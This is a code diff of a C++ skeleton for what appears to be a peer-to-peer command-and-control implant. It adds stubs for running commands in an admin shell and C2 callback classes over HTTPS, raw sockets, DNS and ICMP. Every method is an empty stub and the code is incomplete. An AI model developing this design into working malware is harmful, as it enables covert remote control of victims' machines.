@@ -1,9 +1,6 @@
-#include <iostream>
-#include <array>
-#include <string>
-#include <json/json.h>
 
-bool debug = True;
+
+bool debug = true;
 
 enum State { //The current state of the agent
     INIT,                           //starting state, attempt to contact network
@@ -21,13 +18,13 @@ protected:
     State state;                    //which state of the state machine is the network in
     virtual void doStep();          //do the actual work for each state.
     static list peers;              //list of active peer nodes (shared between networks)
-    static Settings settings        //object which stores settings for both networks
+    static Settings settings;       //object which stores settings for both networks
 
 public:
     int stateCounter;               //how many steps we have been in the current state
     int stepTime;                   //time between network transactions.
 
-    virutal void changeState(string reason="") {    //update universal variables on state change
+    void changeState(State newState, string reason="") {    //update universal variables on state change
         stateCounter = 0;
         state = newState;
         //debug: print state change + reason
@@ -61,8 +58,8 @@ protected:
         //when finished, delete the entry for this step
     }
 
-    string OS_CMD(String CMD){
-        //spawn an admin shell in a separate thread with the command
+    string doOS_CMD(String CMD){
+        //spawn an admin shell with the command
         //when it finishes return the result
     }
 
@@ -157,8 +154,36 @@ protected:
     }
 public:
     State state;
-    string c2Address;
+
     int targetEnvoyNumber;          //how many envoys to keep promoted at any given time
+
+};
+
+class EnvoyC2Connection {
+protected:
+    string c2Address;
+    Proto proto;
+    int rPort;
+    int lPort;
+
+public:
+    string doC2Callback(String outboundJSONData);
+    //constructor makes an object of the right type
+};
+
+class EnvoyHTTPSCallback : EnvoyC2Connection {
+
+};
+
+class EnvoyRawSocketCallback : EnvoyC2Connection {
+
+};
+
+class EnvoyDNSCallback : EnvoyC2Connection {
+
+};
+
+class EnvoyICMPCallback : EnvoyC2Connection {
 
 };
 
